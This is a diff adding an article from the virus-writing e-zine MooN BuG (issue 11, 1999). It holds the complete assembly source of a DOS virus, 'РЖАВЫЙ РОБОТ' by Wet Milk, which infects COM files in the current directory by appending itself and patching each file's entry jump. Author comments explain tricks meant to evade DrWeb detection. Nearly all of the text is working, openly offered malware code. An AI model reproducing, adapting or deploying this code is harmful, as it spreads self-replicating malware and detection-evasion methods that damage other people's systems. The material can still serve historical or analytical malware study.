@@ -1,0 +1,203 @@
+╔════════╤════════════════════════════════════════════════════╤══════════╤═══╗
+║Okt 1999│NF представляет электронный журнал MooN BuG issue 11│ Wet Milk │014║
+╟────────┴────────────────────────────────────────────────────┴──────────┴───╢
+║                             Вирус РЖАВЫЙ РОБОТ                             ║
+╚════════════════════════════════════════════════════════════════════════════╝
+
+;==================================================
+;=         РЖАВЫЙ РОБОТ by Wet Milk               =
+;==================================================
+;                                                 ;
+; Примитивный вирус, заражающий COM-файлы в теку- ;
+; щей директории. До предела прост, но имеются па-;
+; ра изюминок:                                    ;
+; 1) bp вынимается из стека напрямую, а не коман- ;
+;    дой POP, благодаря этому DrWeb больше не     ;
+;    считает, что это Ninnyish.Generic            ;
+; 2) основная идея - перед выполнением Int21      ;
+;    регистры загружаются не командами MOV,       ;
+;    а из заранее подготовленной таблицы.         ;
+; Всего этого оказалось достаточно, чтобы превра- ;
+; тить обычный элементарный Search в более-       ;
+; менее конкурентоспособный (в рамках текущей     ;
+; директории :) вирус.                            ;
+;=================================================;
+.286
+Cseg   segment
+       assume cs:Cseg, ds:Cseg, ss:Cseg
+       org 100h
+;
+VL     EQU Finish-Start
+FIN    EQU 0FFFFh
+;
+Start:
+       pusha
+       call Next
+Next:
+
+; Вынимаем bp из стека напрямую
+       mov bp, sp
+       mov bp, [bp]
+       add sp, 2
+       sub bp, (Next-Start)+100h
+
+; Восстанавливаем спрятанные байты
+       mov di, offset Start
+       lea si, SaveB[bp]
+       movsw
+       movsw
+
+; Настраиваем список команд
+       lea ax, Finish[bp]
+       mov [SetDTA+4][bp], ax
+       lea ax, FMask[bp]
+       mov [Find1+4][bp], ax
+       lea ax, [Finish+30][bp]
+       mov [OpenF+4][bp], ax
+       lea ax, SaveB[bp]
+       mov [Read0+4][bp], ax
+       lea ax, Start[bp]
+       mov [WriteE+4][bp], ax
+       lea ax, Jump[bp]
+       mov [Write0+4][bp], ax
+
+; Устанавливаем новый DTA
+       lea  si, SetDTA[bp]
+       call Exec21
+
+; Ищем 1-й файл по маске
+       lea  si, Find1[bp]
+       call Exec21
+NextF:
+       jc  GoHome
+       jmp short LookF
+
+; Фрагмент возврата управления
+
+GoHome:
+
+; Восстанавливаем DTA
+       lea si, RstDTA[bp]
+       call Exec21
+
+; Передаем управление оригинальной программе
+       popa
+       push 100h
+       ret
+LookF:
+
+; Открываем файло
+       lea si, OpenF[bp]
+       call Exec21
+       mov bx,ax
+
+; Читаем начало файла в буфер
+       lea si, Read0[bp]
+       call Exec21
+
+; Контроль на зараженность
+       cmp byte ptr SaveB[bp], 0E9h
+       jnz InfIt
+
+NoInf:
+; Закрываем файло
+       lea si, CloseF[bp]
+       call Exec21
+
+; Переходим на поиск следующего
+       lea si, FindN[bp]
+       call Exec21
+       jmp NextF
+
+; Инфицируем файло
+InfIt:
+; Переходим на конец
+       lea si, SeekE[bp]
+       call Exec21
+
+; Контроль длины
+       cmp ax, 64000
+       jae NoInf
+       push ax
+
+       push word ptr Start[bp]
+       push word ptr Start[bp+2]
+
+       mov  word ptr Start[bp], 0E860h
+       mov  word ptr Start[bp+2], 0000h
+
+; Приписываемся к концу
+       lea  si, WriteE[bp]
+       call Exec21
+
+       pop word ptr Start[bp+2]
+       pop word ptr Start[bp]
+
+; Переходим на начало
+       lea si, Seek0[bp]
+       call Exec21
+
+; Генерируем команду перехода на вирус
+       pop ax
+       sub ax, 3
+       mov word ptr XXXX[bp], ax
+
+; Вписываем ее в начало программы
+       lea si, Write0[bp]
+       call Exec21
+
+; Продолжаем поиски
+       jmp short NoInf
+
+;======================================================
+;=       Процедура исполнения команд из таблицы       =
+;======================================================
+Exec21:
+       cmp word ptr [si], FIN
+       jz  @1
+       mov ax, word ptr [si]
+@1:
+       cmp word ptr [si+2], FIN
+       jz  @2
+       mov cx, word ptr [si+2]
+@2:
+       cmp word ptr [si+4], FIN
+       jz  @3
+       mov dx, word ptr [si+4]
+@3:
+       int 21h         ; А это собственно вызов ДОСа
+       ret
+
+;=====================================================
+;=          Таблица значений регистров               =
+;=====================================================
+;         ax     cx   dx
+;         ^      ^    ^
+SetDTA dw 1A00h, FIN, 0      ; Установка нового DTA
+RstDTA dw 1A00h, FIN, 80h    ; Возврат прежнего DTA
+Find1  dw 4E00h, 0  , 0      ; Поиск 1-го файла
+FindN  dw 4F00h, FIN, FIN    ; Поиск следующего файла
+Seek0  dw 4200h, 0  , 0      ; Переход на начало
+SeekE  dw 4202h, 0  , 0      ; Переход на конец
+OpenF  dw 3D02h, FIN, 0      ; Открытие файла
+CloseF dw 3E00h, FIN, FIN    ; Закрытие файла
+Read0  dw 3F00h, 4  , 0      ; Чтение начала файла
+WriteE dw 4000h, VL , 0      ; Дописывание себя в конец
+Write0 dw 4000h, 4  , 0      ; Вписывание нового начала
+
+;====================================================
+;=               Просто вирусные данные             =
+;====================================================
+FMask  db '*.com',0h
+Jump   db 0E9h
+XXXX   dw ?
+       db 0
+SaveB  db 0C3h, 0C3h, 0C3h, 0C3h
+CopyRT db   '[DER ROSTIG ROBOT] (c) Wet Milk',0
+;
+Finish:
+;
+Cseg    Ends
+        End Start
+
+
